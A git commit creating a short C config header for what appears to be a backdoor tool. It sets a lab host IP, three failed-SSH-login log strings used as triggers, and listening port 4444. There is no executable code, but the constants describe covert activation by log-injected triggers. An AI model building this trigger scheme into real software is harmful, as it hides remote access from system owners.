b07c5b8e3797a76025f1f9d32ed274ae72b3ee66
D3cl4n <38691337+D3cl4n@users.noreply.github.com>
2021-08-20 00:16:27 -0400

    Create config.h

---
+++ config.h
@@ -0,0 +1,7 @@
+//CONFIG FILE, CHANGE AS NEEDED
+
+#define host "192.168.239.129"
+#define TRIGGER_1 "Failed password for invalid user admin123"
+#define TRIGGER_2 "Failed password for invalid user user123"
+#define TRIGGER_3 "Failed password for invalid user clear123"
+#define LISTENING_PORT 4444
